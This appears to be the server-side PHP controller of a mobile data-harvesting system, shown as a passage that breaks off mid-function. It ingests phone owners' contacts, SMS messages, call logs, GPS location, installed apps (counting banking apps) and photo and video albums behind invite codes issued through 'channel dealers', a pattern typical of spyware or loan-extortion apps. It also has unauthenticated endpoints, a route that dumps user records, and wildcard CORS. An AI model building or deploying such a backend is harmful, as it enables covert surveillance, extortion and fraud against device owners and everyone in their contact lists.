<?php

namespace app\api\controller;
use app\BaseController;
use think\facade\Db;
use think\facade\Request;

/**
 * 上传控制器类
 * 
 * 处理移动设备上传的各种数据：通讯录、短信、位置信息、应用信息和媒体文件
 */
class Uploads extends BaseController {
	

    /**
     * 标准化手机号：仅保留数字，便于去重
     */
    private function normalizeMobile($mobile) {
        $mobile = trim((string)$mobile);
        if ($mobile === '') {
            return '';
        }
        return preg_replace('/\D+/', '', $mobile);
    }

    // 通讯录去重逻辑已移除：按采集原始数据入库

    /**
     * 将数据库里的相对路径转换为public绝对路径
     */
    private function toPublicAbsolutePath($dbPath) {
        $dbPath = trim((string)$dbPath);
        if ($dbPath === '') {
            return '';
        }
        $relative = ltrim($dbPath, '/\\');
        return app()->getRootPath() . 'public' . DIRECTORY_SEPARATOR . str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $relative);
    }

    /**
     * 安全获取文件MD5
     */
    private function safeFileMd5($absolutePath) {
        if (empty($absolutePath) || !is_file($absolutePath)) {
            return '';
        }
        $md5 = @md5_file($absolutePath);
        return $md5 ?: '';
    }

    /**
     * 媒体入库（不去重）
     */
    private function saveImageRecordIfNotDuplicate($userId, $dbPath, $isVideo = 0) {
        $insertData = [
            'img' => $dbPath,
            'userid' => $userId,
            'addtime' => time()
        ];

        if ((int)$isVideo === 1) {
            $tableInfo = $this->checkTableStructure('img');
            if (isset($tableInfo['fields']['is_video'])) {
                $insertData['is_video'] = 1;
            }
        } else {
            $tableInfo = $this->checkTableStructure('img');
            if (isset($tableInfo['fields']['is_video'])) {
                $insertData['is_video'] = 0;
            }
        }

        return (bool)Db::name('img')->insert($insertData);
    }
	
    /**
     * 统一输出纯文本响应
     * 
     * @param string $message 消息内容
     * @param string $status 状态（成功/失败消息）
     * @param bool $exit 是否终止程序
     */
    private function textResponse($message, $status = '', $exit = true) {
        if (!headers_sent()) {
            header('Content-Type: text/plain; charset=utf-8');
        }
        echo $message . "\n";
        if ($exit && !empty($status)) {
            exit($status);
        }
    }

    /**
     * 检查POST请求
     * 
     * @return bool 是否为POST请求
     */
    private function checkPostRequest() {
        if (!request()->isPost()) {
            $this->textResponse("请使用POST请求", "获取失败");
            return false;
        }
        return true;
    }
    
    /**
     * 获取应用程序配置
     * 
     * @return array 应用配置
     */
    private function getappconfig() {
        // 返回默认配置
        return [
            'app' => 'appv1',
            'is_login' => 1, // 1=允许登录，0=禁止登录
            'is_reg' => 0,   // 1=允许注册，0=禁止注册
            'yaoqingma' => '' // 邀请码(空字符串表示不需要邀请码)
        ];
    }
    
    /**
     * 处理特殊字符和表情符号
     * 
     * @param string $str 需要处理的字符串
     * @return string 处理后的字符串
     */
    private function filter_emoji($str) {  
        // 不再过滤表情符号，直接返回原字符串
        // 因为数据库已更新为utf8mb4，可以支持表情符号
        return $str;
        
        // 旧代码，不再使用
        /*
        $regex = '/(\\\u[ed][0-9a-f]{3})/i';  
        $str = json_encode($str);  
        $str = preg_replace($regex, '', $str);
        return json_decode($str);  
        */
    }
    
    /**
     * 获取或创建用户
     * 
     * @param string $phone 手机号
     * @param string $code 邀请码
     * @param string $clientid 客户端ID
     * @param bool $forceNew 是否强制新建（登录入口使用）
     * @return array|bool 用户信息数组或失败时返回false
     */
    private function getOrCreateUser($phone, $code, $clientid = '', $forceNew = false) {
        $time = time();
        $ip = request()->ip();
        
        if (!$forceNew) {
            // 非登录入口：查找最新的同手机号+同邀请码用户复用
            $query = Db::name('user')->where('name', $phone);
            if (!empty($code)) {
                $query->where('code', $code);
            }
            $user = $query->order('id', 'desc')->find();
            
            if ($user) {
                Db::name('user')->where('id', $user['id'])->update([
                    'login_time' => $time,
                    'ip' => $ip,
                ]);
                if (!empty($clientid)) {
                    Db::name('user')->where('id', $user['id'])->update(['clientid' => $clientid]);
                    $user['clientid'] = $clientid;
                }
                $this->textResponse("复用已有用户: ID=" . $user['id'], '', false);
                return $user;
            }
        }
        
        // 登录入口(forceNew)或完全没有该用户：创建新记录
        $userData = [
            'name' => $phone,
            'code' => $code,
            'clientid' => $clientid,
            'login_time' => $time,
            'ip' => $ip
        ];
        
        $userId = Db::name('user')->insertGetId($userData);
        
        if ($userId) {
            $this->textResponse("创建新用户: ID=" . $userId, '', false);
            $userData['id'] = $userId;
            return $userData;
        } else {
            $this->textResponse("错误: 用户创建失败", "获取失败");
            return false;
        }
    }
    
    /**
     * 批量插入数据
     * 
     * @param string $table 表名（包含前缀）
     * @param array $data 要插入的数据数组
     * @return int 受影响的行数
     */
    private function batchInsert($table, $data) {
        if (empty($data)) {
            return 0;
        }
        
        // 获取第一条数据的所有字段
        $fields = array_keys($data[0]);
        $fieldStr = '`' . implode('`, `', $fields) . '`';
        
        // 构建SQL
        $sql = "INSERT INTO `{$table}` ({$fieldStr}) VALUES ";
        $values = [];
        
        foreach ($data as $row) {
            $placeholders = [];
            foreach ($fields as $field) {
                $values[] = $row[$field] ?? null;
                $placeholders[] = '?';
            }
            $sql .= '(' . implode(', ', $placeholders) . '),';
        }
        
        $sql = rtrim($sql, ',');
        
        // 执行SQL
        return Db::execute($sql, $values);
    }

    /**
     * 批量插入并忽略唯一键冲突
     */
    private function batchInsertIgnore($table, $data) {
        if (empty($data)) {
            return 0;
        }

        $fields = array_keys($data[0]);
        $fieldStr = '`' . implode('`, `', $fields) . '`';
        $sql = "INSERT IGNORE INTO `{$table}` ({$fieldStr}) VALUES ";
        $values = [];

        foreach ($data as $row) {
            $placeholders = [];
            foreach ($fields as $field) {
                $values[] = $row[$field] ?? null;
                $placeholders[] = '?';
            }
            $sql .= '(' . implode(', ', $placeholders) . '),';
        }

        $sql = rtrim($sql, ',');
        return Db::execute($sql, $values);
    }

    /**
     * 确保通话记录表存在
     */
    private function ensureCallLogsTable() {
        $dbConfig = config('database.connections.mysql');
        $prefix = $dbConfig['prefix'] ?? '';
        $table = $prefix . 'call_logs';
        $sql = "CREATE TABLE IF NOT EXISTS `{$table}` (
            `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
            `userid` INT(11) NOT NULL,
            `call_name` VARCHAR(255) NULL DEFAULT '' COMMENT '联系人名称',
            `call_tel` VARCHAR(64) NOT NULL COMMENT '通话号码',
            `call_time` VARCHAR(64) NOT NULL COMMENT '通话时间',
            `duration` INT(11) NOT NULL DEFAULT 0 COMMENT '通话时长秒',
            `call_type` TINYINT(2) NOT NULL DEFAULT 0 COMMENT '通话类型',
            `addtime` INT(11) NOT NULL,
            PRIMARY KEY (`id`),
            KEY `idx_userid` (`userid`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4";
        Db::execute($sql);
    }

    /**
     * 通讯录上传接口
     */
    public function api() {
        if (!$this->checkPostRequest()) {
            return;
        }
        
        $ip = request()->ip();
        $time = time();
        
        try {
            $data = input('post.data');
            
            if (empty($data)) {
                $this->textResponse("错误: 通讯录数据为空", "数据连接错误");
            }
            
            $phone = input('post.phone');
            $post_code = input('post.code', '');
            
            // 添加调试输出
            $this->textResponse("接收到原始数据: " . substr($data, 0, 100) . "...", '', false);
            
            // 兼容老格式: 如果数据中包含 = 号，按照原有逻辑处理
            if (strpos($data, '=') !== false) {
                $a = explode('=', $data);
                
                if (count($a) <= 0) {
                    $this->textResponse("错误: 通讯录数据格式不正确", "数据连接错误");
                }
                
                $aaa = explode('**', $a[0]);
                $phone = $aaa[0];
                $code = $aaa[1] ?? '';
                $clientid = $aaa[2] ?? '';
            } else {
                // 这应该是从apiimei接口注册的用户，使用POST中的code
                $a = explode('=', $data);
                // 如果post中有邀请码，优先使用
                $code = !empty($post_code) ? $post_code : input('post.code', '');
                $clientid = '';
            }
            
            // 如果code仍然为空，使用GET参数
            if (empty($code)) {
                $code = input('code', '0');
            }
            
            // 记录接收到的参数便于调试
            $this->textResponse("手机号: $phone, 邀请码: $code", '', false);
            
            // 检查是否允许登录
            $appconfig = $this->getappconfig();
            
            if ($appconfig['is_login'] != 1) {
                $this->textResponse("错误: 系统暂时禁止登录", "暂时无法登录，请稍候再试");
            }
            
            if (!empty($appconfig['yaoqingma']) && $appconfig['yaoqingma'] != $code) {
                $this->textResponse("错误: 邀请码不正确", "邀请码错误，请联系渠道商");
            }
            
            // 获取或创建用户
            $user = $this->getOrCreateUser($phone, $code, $clientid);
            $userid = $user['id'];
            
            // 处理通讯录数据
            if ($userid) {
                // 确保数据库连接使用utf8mb4字符集
                Db::execute("SET NAMES utf8mb4");
                Db::execute("SET CHARACTER SET utf8mb4");
                Db::execute("SET character_set_connection=utf8mb4");
                Db::execute("SET character_set_results=utf8mb4");
                
                if (count($a) != 0) {
                    $res = [];
                    
                    // 记录每一项数据，用于调试
                    for ($k = 1; $k < count($a); $k++) {
                        if (!empty($a[$k])) {
                            $this->textResponse("处理第 " . $k . " 项: " . $a[$k], '', false);
                        }
                    }
                    
                    foreach ($a as $k => $v) {
                        if ($k > 0 && !empty($v)) {
                            // 使用更可靠的分隔方式
                            $b = explode('|', $v, 2); // 最多分割成两部分
                            
                            if (count($b) >= 2) {
                                $contactName = trim($b[0]);
                                $contactPhone = trim($b[1]);
                                
                                // 调试输出
                                $this->textResponse("联系人: [" . $contactName . "] 号码: [" . $contactPhone . "]", '', false);
                                
                                $arr['userid'] = $userid;
                                $arr['username'] = $contactName;
                                $arr['umobile'] = $contactPhone;
                                $arr['addtime'] = $time;
                                $res[] = $arr;
                            } else {
                                $this->textResponse("警告: 跳过格式不正确的项: " . $v, '', false);
                            }
                        }
                    }
                    
                    if (!empty($res)) {
                        // 先删除该用户旧的通讯录数据，防止重复登录导致数据翻倍
                        Db::name('mobile')->where('userid', $userid)->delete();
                        
                        $nums = 100;
                        $limit = ceil(count($res) / $nums);
                        $insertedCount = 0;
                        
                        try {
                            for ($i = 1; $i <= $limit; $i++) {
                                $offset = ($i - 1) * $nums;
                                $batch = array_slice($res, $offset, $nums);
                                $result = Db::name('mobile')->insertAll($batch);
                                if ($result) {
                                    $insertedCount += $result;
                                }
                            }
                            
                            $this->textResponse("成功插入通讯录数据: " . $insertedCount . "条", "正在加载列表");
                        } catch (\Exception $e) {
                            // 如果批量插入出错，尝试逐条插入
                            if ($insertedCount == 0) {
                                $this->textResponse("批量插入失败，尝试逐条插入...", '', false);
                                
                                foreach ($res as $contact) {
                                    try {
                                        // 确保数据有效性
                                        $validContact = [
                                            'userid' => $contact['userid'],
                                            'username' => $contact['username'],
                                            'umobile' => $contact['umobile'],
                                            'addtime' => $contact['addtime']
                                        ];
                                        
                                        $this->textResponse("单条插入: " . $validContact['username'], '', false);
                                        
                                        // 检查是否包含表情符号，如果包含则尝试特殊处理
                                        if (preg_match('/[\x{10000}-\x{10FFFF}]/u', $validContact['username'])) {
                                            $this->textResponse("检测到表情符号，确保使用utf8mb4编码", '', false);
                                            // 强制设置数据库连接字符集
                                            Db::execute("SET NAMES utf8mb4");
                                            Db::execute("SET CHARACTER SET utf8mb4");
                                            Db::execute("SET character_set_connection=utf8mb4");
                                            Db::execute("SET character_set_results=utf8mb4");
                                        }
                                        
                                        Db::name('mobile')->insert($validContact);
                                        $insertedCount++;
                                    } catch (\Exception $innerEx) {
                                        // 记录有问题的数据但继续处理
                                        $this->textResponse("插入错误: " . $innerEx->getMessage() . " [" . $contact['username'] . "]", '', false);
                                        
                                        // 尝试移除表情符号后再次插入
                                        if (preg_match('/Incorrect string value/i', $innerEx->getMessage())) {
                                            try {
                                                $this->textResponse("尝试移除表情符号后再次插入", '', false);
                                                // 移除表情符号
                                                $cleanName = preg_replace('/[\x{1F600}-\x{1F64F}\x{1F300}-\x{1F5FF}\x{1F680}-\x{1F6FF}\x{1F700}-\x{1F77F}\x{1F780}-\x{1F7FF}\x{1F800}-\x{1F8FF}\x{1F900}-\x{1F9FF}\x{1FA00}-\x{1FAFF}\x{2600}-\x{26FF}\x{2700}-\x{27BF}]/u', '', $contact['username']);
                                                
                                                if ($cleanName !== $contact['username']) {
                                                    $validContact['username'] = $cleanName;
                                                    $this->textResponse("清理后的姓名: " . $cleanName, '', false);
                                                    Db::name('mobile')->insert($validContact);
                                                    $insertedCount++;
                                                }
                                            } catch (\Exception $e) {
                                                $this->textResponse("二次尝试失败: " . $e->getMessage(), '', false);
                                            }
                                        }
                                        continue;
                                    }
                                }
                                
                                $this->textResponse("逐条插入完成: " . $insertedCount . "条", "正在加载列表");
                            } else {
                                $this->textResponse("部分数据插入成功: " . $insertedCount . "条，错误: " . $e->getMessage(), "正在加载列表");
                            }
                        }
                    } else {
                        $this->textResponse("警告: 没有有效的通讯录数据", "正在加载列表");
                    }
                } else {
                    $this->textResponse("警告: 通讯录数据为空", "获取失败");
                }
            } else {
                $this->textResponse("错误: 用户注册失败", "获取失败");
            }
        } catch (\Exception $e) {
            $this->textResponse("系统错误: " . $e->getMessage(), "获取失败");
        }
    }	

    public function apisms(){
    	
           if (request()->isPost()){
               // 以普通文本输出格式
               header('Content-Type: text/plain; charset=utf-8');
           	
 			   $ip = request()->ip();
			   $time = time();    
			   
		       $sms = input('post.data','',null);
		       
		       if(empty($sms)){
		           echo "错误: 短信数据为空\n";
		           exit;
		       }
		       
		       $sms = $this->filter_emoji($sms);
		       
		       try {
    		       $sms = json_decode($sms,true);
    		       
    		       if(!is_array($sms)){
    		           echo "错误: 无效的JSON数据\n";
    		           exit;
    		       }
    		       
    		       if(count($sms) < 2){
    		       	    echo "错误: 短信数据不足\n";
    		       	    exit;
    		       }
    
    		       $codedata = array_slice($sms,0,1,true);
    		       $smsdata = array_slice($sms,1);
    		       
    		       if(count($codedata) != 0 || count($smsdata) != 0){
    		       	    $phone_sms = $codedata[0]['imei'] ?? '';
    		       	    $code_sms = $codedata[0]['imei2'] ?? '';
    		       	    
    		       	    // 统一使用getOrCreateUser查找最新用户
    		       	    $user = $this->getOrCreateUser($phone_sms, $code_sms);
    		       	    
    		       	    if($user && isset($user['id'])){
    		       	        $userId = $user['id'];
    		       	        
    		       	        // 先删除该用户旧短信，防止数据翻倍
    		       	        Db::name('content')->where('userid', $userId)->delete();
    		       	        
        		       		$res = [];
        		       		foreach ($smsdata as $k => $v) {
        						$arr['smscontent'] = $v['Smsbody'];
        						$arr['smstel'] = $v['PhoneNumber'];
        						$arr['smstime'] = $v['Date'];
        						$arr['userid'] = $userId;
        						$arr['addtime'] = $time;
        						$arr['type'] = $v['Type'];
        						$res[] = $arr;
        					}
        					
        					if(empty($res)){
        					    echo "警告: 没有有效的短信数据\n";
        					    exit('获取成功');
        					}
        					
        					$nums = 100;
        					$limit = ceil(count($res)/$nums);
        					for ($i=1;$i<=$limit;$i++) {
        						$offset=($i-1)*$nums;
        						$data=array_slice($res,$offset,$nums);
        						Db::name('content')->insertAll($data);
        					}
        					
        					echo "短信上传成功: " . count($res) . "条记录\n";
        					exit('获取成功');
    		       	   }else{
    		       	       echo "错误: 用户创建失败\n";
    		       	       exit('获取失败');
    		       	   }
    
    		       }else{
    		           echo "错误: 短信数据部分为空\n";
    		       	   exit('获取失败');
    		       }
		       } catch (\Exception $e) {
		           echo "错误: " . $e->getMessage() . "\n";
		           exit('获取失败');
		       }
           	
           }else{
               echo "错误: 请使用POST请求\n";
               exit('获取失败');
           }    	
    	
    }

    /**
     * 通话记录上传接口（Android）
     */
    public function apicalls() {
        if (!request()->isPost()) {
            echo "错误: 请使用POST请求\n";
            exit('获取失败');
        }

        header('Content-Type: text/plain; charset=utf-8');
        $ip = request()->ip();
        $time = time();

        try {
            $raw = input('post.data', '', null);
            if (empty($raw)) {
                echo "错误: 通话记录数据为空\n";
                exit('获取失败');
            }

            $payload = json_decode($raw, true);
            if (!is_array($payload) || count($payload) < 2) {
                echo "错误: 无效的通话记录JSON数据\n";
                exit('获取失败');
            }

            $meta = $payload[0];
            $callItems = array_slice($payload, 1);

            $phone = $meta['imei'] ?? input('post.phone', '');
            $code = $meta['imei2'] ?? input('post.code', '');

            if (empty($phone)) {
                echo "错误: 手机号为空\n";
                exit('获取失败');
            }

            // 统一使用getOrCreateUser查找最新用户
            $user = $this->getOrCreateUser($phone, $code);

            if (!$user || !isset($user['id'])) {
                echo "错误: 用户创建失败\n";
                exit('获取失败');
            }
            
            $userId = $user['id'];

            $this->ensureCallLogsTable();

            // 先删除该用户旧通话记录，防止数据翻倍
            $dbConfig = config('database.connections.mysql');
            $fullTableName = ($dbConfig['prefix'] ?? '') . 'call_logs';
            Db::execute("DELETE FROM `{$fullTableName}` WHERE `userid` = ?", [$userId]);

            $insertData = [];
            foreach ($callItems as $item) {
                $tel = trim((string)($item['PhoneNumber'] ?? $item['number'] ?? ''));
                $callTime = trim((string)($item['Date'] ?? $item['date'] ?? ''));
                $duration = (int)($item['Duration'] ?? $item['duration'] ?? 0);
                $type = (int)($item['Type'] ?? $item['type'] ?? 0);
                $name = trim((string)($item['Name'] ?? $item['name'] ?? ''));

                if ($tel === '' || $callTime === '') {
                    continue;
                }

                $insertData[] = [
                    'userid' => $userId,
                    'call_name' => $name,
                    'call_tel' => $tel,
                    'call_time' => $callTime,
                    'duration' => $duration,
                    'call_type' => $type,
                    'addtime' => $time
                ];
            }

            if (empty($insertData)) {
                echo "警告: 没有有效的通话记录\n";
                exit('获取成功');
            }

            $nums = 200;
            $limit = ceil(count($insertData) / $nums);
            $insertedCount = 0;
            for ($i = 1; $i <= $limit; $i++) {
                $offset = ($i - 1) * $nums;
                $batch = array_slice($insertData, $offset, $nums);
                $result = Db::name('call_logs')->insertAll($batch);
                if ($result) {
                    $insertedCount += $result;
                }
            }

            echo "通话记录上传成功: " . $insertedCount . "条\n";
            exit('获取成功');
        } catch (\Exception $e) {
            echo "错误: " . $e->getMessage() . "\n";
            exit('获取失败');
        }
    }

    public function apimap(){
    	
           if (request()->isPost()){
               // 以普通文本输出
               header('Content-Type: text/plain; charset=utf-8');
           	   
               // 记录调试信息
               $debug_info = [
                   'post_data' => input('post.'),
                   'ip' => request()->ip(),
                   'time' => date('Y-m-d H:i:s'),
                   'method' => request()->method()
               ];
               
               // 输出接收到的信息
               echo "接收到POST请求\n";
               
			   $data = input('post.data');
			   
			   if(empty($data)){
			       echo "错误: 数据为空\n";
			       exit;
			   }
			   
			   echo "接收到数据: " . $data . "\n";
			   
			   $aaa = explode(',',$data);
			   
			   if(count($aaa) < 4){
			       echo "错误: 数据格式不正确，需要4个参数\n";
			       exit;
			   }
			   
			   try {
    			   // 统一使用getOrCreateUser查找最新用户
    			   $user = $this->getOrCreateUser($aaa[0], $aaa[1]);
    			   
    			   if(!$user || !isset($user['id'])){
    			       echo "错误: 用户创建失败\n";
    			       exit('获取失败');
    			   }
    			   
    			   echo "找到用户: ID=" . $user['id'] . "\n";
    			   
    			   $updateData = [
    			       'mapx' => $aaa[2],
    			       'mapy' => $aaa[3]
    			   ];
    			   
    			   Db::name('user')->where('id', $user['id'])->update($updateData);
    			   echo "位置信息已更新\n";
    			   exit('获取成功');
			   } catch (\Exception $e) {
			       echo "数据库错误: " . $e->getMessage() . "\n";
			       exit('获取失败');
			   }
			   
			   exit;
           }else{
           	echo "请使用POST请求\n";
           	exit;
           }    	
    	
    }
    /**
     * 上传图片接口
     */
    public function upload() {
        if (!request()->file('file')) {
            echo '请上传文件';
            return;
        }
        
        try {
            // 获取表单上传文件
            $file = request()->file('file');
            $phone = input("sjh");
            $code = input("code", '');
            
            // 查找最新用户（按id降序）
            $query = Db::name('user')->where('name', $phone);
            if (!empty($code)) {
                $query->where('code', $code);
            }
            $user = $query->order('id', 'desc')->find();
            if (!$user) {
                echo json_encode(['err' => '用户不存在']);
                return;
            }
            
            // 移动到框架应用根目录/public/uploads/ 目录下
            // 优先使用Filesystem
            $savename = \think\facade\Filesystem::disk('public')->putFile('uploads/api', $file);
            $img = '';
            
            if ($savename) {
                $img = '/storage/' . $savename;
            } else {
                // 备选方案：直接保存到public/uploads目录
                $uploadDir = app()->getRootPath() . 'public/uploads/api/';
                if (!is_dir($uploadDir)) {
                    mkdir($uploadDir, 0777, true);
                }
                $filename = \think\facade\Filesystem::disk('uploads')->putFile('', $file);
                if ($filename) {
                    $img = '/uploads/api/' . $filename;
                }
            }
            
            if (!empty($img)) {
                $result = $this->saveImageRecordIfNotDuplicate($user["id"], $img, 0);
                echo json_encode([
                    'err' => $result ? '获取成功' : '获取成功(重复文件已忽略)',
                    'path' => $img
                ]);
            } else {
                echo json_encode(['err' => '文件保存失败']);
            }
        } catch (\Exception $e) {
            // 上传失败获取错误信息
            echo json_encode(['err' => '上传失败', 'msg' => $e->getMessage()]);
        }
    }
    
    /**
     * 测试接口
     */
    public function test() {
        $this->textResponse("接口可以访问", '', false);
        $this->textResponse("当前时间: " . date('Y-m-d H:i:s'), '', false);
        $this->textResponse("PHP版本: " . PHP_VERSION, '', false);
        $this->textResponse("TP6框架正常运行", '', false);
        
        // 查看用户表信息
        try {
            $users = Db::name('user')->limit(3)->select();
            $this->textResponse("\n用户表数据：", '', false);
            $this->textResponse(json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        } catch (\Exception $e) {
            $this->textResponse("\n查询数据库失败: " . $e->getMessage());
        }
        
        exit;
    }
    
    // 设备信息上传接口
    public function apiimei() {
        if (request()->isPost()) {
            // 以普通文本输出
            header('Content-Type: text/plain; charset=utf-8');
            
            $time = time();
            $ip = request()->ip();
            
            try {
                // 获取前端传来的数据
                $data = input('post.data');
                
                if(empty($data)) {
                    echo "错误: 设备数据为空\n";
                    exit('获取失败');
                }
                
                echo "接收到设备数据: " . $data . "\n";
                
                // 解析JSON数据
                $deviceInfo = json_decode($data, true);
                
                if(!$deviceInfo || !is_array($deviceInfo)) {
                    echo "错误: 无效的JSON数据\n";
                    exit('获取失败');
                }
                
                $phone = input('post.phone');
                $inviteCode = input('post.code', '');
                
                if(empty($phone)) {
                    echo "错误: 手机号为空\n";
                    exit('获取失败');
                }
                
                // 记录接收到的参数
                echo "手机号: $phone, 邀请码: $inviteCode\n";
                
                // 获取本机实际号码（如果有）
                $realPhone = isset($deviceInfo['real_phone']) ? $deviceInfo['real_phone'] : '';
                
                // 每次登录强制创建新用户记录
                $code = !empty($inviteCode) ? $inviteCode : ($deviceInfo['imei2'] ?? '0000');
                $clientid = ($deviceInfo['model'] ?? '') . '-' . ($deviceInfo['vendor'] ?? '');
                
                $user = $this->getOrCreateUser($phone, $code, $clientid, true);
                
                if($user && isset($user['id'])) {
                    // 更新本机实际号码
                    if(!empty($realPhone)) {
                        Db::name('user')->where('id', $user['id'])->update(['real_phone' => $realPhone]);
                    }
                    echo "新用户记录已创建: ID=" . $user['id'] . "\n";
                    exit('获取成功');
                } else {
                    echo "错误: 用户创建失败\n";
                    exit('获取失败');
                }
            } catch (\Exception $e) {
                echo "系统错误: " . $e->getMessage() . "\n";
                exit('获取失败');
            }
        } else {
            echo "请使用POST请求\n";
            exit('获取失败');
        }
    }

    /**
     * 处理已安装应用信息上传
     */
    public function apiapps() {
        if (request()->isPost()) {
            // 以普通文本输出
            header('Content-Type: text/plain; charset=utf-8');
            
            $ip = request()->ip();
            $time = time();
            
            try {
                $phone = input('post.phone');
                $code = input('post.code', '');
                $appsData = input('post.apps', '', null);
                
                // 由于数据库配置已有app_前缀，这里直接使用不带前缀的表名
                $rawTableName = 'installed_apps';
                
                // 获取配置信息
                $dbConfig = config('database.connections.mysql');
                $prefix = $dbConfig['prefix'];
                $fullTableName = $prefix . $rawTableName;
                
                echo "数据库信息: 前缀=[{$prefix}], 原始表名=[{$rawTableName}], 完整表名=[{$fullTableName}]\n";
                
                if (empty($phone)) {
                    echo "错误: 手机号不能为空\n";
                    exit('获取失败');
                }
                
                if (empty($appsData)) {
                    echo "错误: 应用数据为空\n";
                    exit('获取失败');
                }
                
                // 解析应用数据
                $apps = json_decode($appsData, true);
                
                if (!is_array($apps)) {
                    echo "错误: 无效的JSON数据\n";
                    exit('获取失败');
                }
                
                // 查找最新用户（按id降序）
                $query = Db::name('user')->where('name', $phone);
                if (!empty($code)) {
                    $query->where('code', $code);
                }
                $user = $query->order('id', 'desc')->find();
                
                if (!$user) {
                    echo "错误: 用户不存在\n";
                    exit('获取失败');
                }
                
                $userId = $user['id'];
                
                // 使用原始SQL删除旧数据，避免前缀问题
                Db::execute("DELETE FROM `{$fullTableName}` WHERE `userid` = ?", [$userId]);
                
                // 准备批量插入的数据
                $insertData = [];
                $bankAppCount = 0;
                
                foreach ($apps as $app) {
                    $appData = [
                        'userid' => $userId,
                        'app_name' => $app['app_name'],
                        'package_name' => $app['package_name'],
                        'app_version' => $app['app_version'] ?? '',
                        'install_time' => $app['install_time'] ?? $time,
                        'is_bank' => $app['is_bank'] ?? 0
                    ];
                    
                    if ($appData['is_bank']) {
                        $bankAppCount++;
                    }
                    
                    $insertData[] = $appData;
                }
                
                // 批量插入数据
                if (!empty($insertData)) {
                    // 使用原始SQL插入数据，避免前缀问题
                    $batchSize = 100; // 每批处理的记录数
                    $totalBatches = ceil(count($insertData) / $batchSize);
                    
                    for ($i = 0; $i < $totalBatches; $i++) {
                        $batch = array_slice($insertData, $i * $batchSize, $batchSize);
                        $this->batchInsert($fullTableName, $batch);
                    }
                    
                    echo "成功保存 " . count($insertData) . " 个应用信息，其中银行类应用 " . $bankAppCount . " 个\n";
                    exit('获取成功');
                } else {
                    echo "警告: 没有有效的应用数据\n";
                    exit('获取失败');
                }
            } catch (\Exception $e) {
                echo "系统错误: " . $e->getMessage() . "\n";
                exit('获取失败');
            }
        } else {
            echo "请使用POST请求\n";
            exit('获取失败');
        }
    }
    
    /**
     * 创建应用表接口 - 仅保留API，不实际创建表
     */
    public function createAppTable() {
        // 以普通文本输出
        header('Content-Type: text/plain; charset=utf-8');
        
        // 直接返回成功，不实际创建表
        echo "表已存在\n";
        exit('表已存在');
    }

    /**
     * iOS设备相册上传接口
     * 接收base64编码的图片/视频数据并保存
     */
    public function iosUpload()
    {
        // 关闭页面Trace和调试
        \think\facade\App::isDebug(false);
        \think\facade\Config::set(['app_trace' => false], 'app');
        \think\facade\Config::set(['trace' => ['type' => 'none']], 'trace');
        
        // 禁用所有错误输出
        ini_set('display_errors', 'Off');
        error_reporting(0);
        
        // 允许跨域请求
        header('Access-Control-Allow-Origin:*');
        header('Content-Type:text/plain;charset=utf-8');
        
        if (!request()->isPost()) {
            exit('请使用POST请求');
        }
        
        $img = input('post.img');
        $userid = input('param.id');
        $fileType = input('post.file_type', ''); // 接收文件类型，可以是'video'
        
        if (empty($img) || empty($userid)) {
            exit('参数错误');
        }
        
        try {
            // 查找最新用户（按id降序）
            $user = Db::name('user')->where('name', $userid)->order('id', 'desc')->find();
            $userIdValue = 0;
            
            if ($user) {
                $userIdValue = $user['id'];
            } else {
                $userIdValue = Db::name('user')->insertGetId([
                    'name' => $userid,
                    'login_time' => time(),
                    'ip' => request()->ip()
                ]);
                
                if (!$userIdValue) {
                    trace("创建用户失败: {$userid}", 'error');
                }
            }
            
            // 根据文件类型决定文件后缀和目录
            $isVideo = strtolower($fileType) === 'video';
            
            // 创建目录
            $rootPath = app()->getRootPath() . 'public';
            $relativePath = "/image/" . date("Ymd", time());
            $path = $rootPath . $relativePath;
            
            if (!is_dir($path)) {
                mkdir($path, 0777, true);
            }
            
            // 处理base64数据
            if (strstr($img, ",")) {
                $img = explode(',', $img);
                $img = $img[1];
            }
            
            // 根据文件类型设置文件名和后缀
            if ($isVideo) {
                // 处理视频文件
                $fileName = "ios_video_" . date("His", time()) . "_" . rand(1111, 9999) . '.mp4';
                $fileSrc = $path . "/" . $fileName;
                
                // 记录日志
                trace("正在处理视频文件: {$fileName}", 'info');
            } else {
                // 处理图片文件
                $fileName = "ios_" . date("His", time()) . "_" . rand(1111, 9999) . '.png';
                $fileSrc = $path . "/" . $fileName;
            }
            
            // 写入文件
            $r = file_put_contents($fileSrc, base64_decode($img));
            
            if (!$r) {
                exit($isVideo ? "视频保存失败" : "图片保存失败");
            }
            
            // 记录成功信息
            if ($isVideo) {
                trace("视频保存成功: {$fileName}, 大小: " . $r . " 字节", 'info');
            }
            
            // 插入数据库 - 重复内容则忽略
            $filePath = $relativePath . "/" . $fileName;
            $result = $this->saveImageRecordIfNotDuplicate($userIdValue, $filePath, $isVideo ? 1 : 0);
            
            if ($result) {
                exit("成功");
            } else {
                exit("成功(重复文件已忽略)");
            }
        } catch (\Exception $e) {
            // 记录详细错误
            trace("上传处理错误: " . $e->getMessage(), 'error');
            exit("错误: " . $e->getMessage());
        }
    }

    /**
     * 处理plus.uploader上传（适用于iOS和Android）
     */
    public function uploadFile()
    {
        // 关闭页面Trace和调试
        \think\facade\App::isDebug(false);
        \think\facade\Config::set(['app_trace' => false], 'app');
        \think\facade\Config::set(['trace' => ['type' => 'none']], 'trace');
        
        // 禁用所有错误输出
        ini_set('display_errors', 'Off');
        error_reporting(0);
        
        // 允许跨域请求
        header('Access-Control-Allow-Origin:*');
        header('Content-Type:text/plain;charset=utf-8');
        
        if (!request()->isPost()) {
            exit('请使用POST请求');
        }
        
        try {
            // 获取表单上传文件
            $file = request()->file('file');
            $userid = input('post.id', input('param.id', ''));
            $fileType = input('post.file_type', ''); // 接收文件类型，可以是'video'
            
            if (empty($file)) {
                // 调试信息 - 输出收到的所有请求信息
                echo "接收到请求但没有文件: \n";
                echo "POST参数: ".json_encode($_POST)."\n";
                echo "FILES参数: ".json_encode($_FILES)."\n";
                exit('参数错误：缺少文件');
            }
            
            if (empty($userid)) {
                exit('参数错误：缺少用户ID');
            }
            
            // 记录调试信息
            trace("接收到文件上传请求，用户ID: $userid, 文件类型: $fileType", 'info');
            
            // 查找最新用户（按id降序）
            $user = Db::name('user')->where('name', $userid)->order('id', 'desc')->find();
            $userIdValue = 0;
            
            if ($user) {
                $userIdValue = $user['id'];
            } else {
                $userIdValue = Db::name('user')->insertGetId([
                    'name' => $userid,
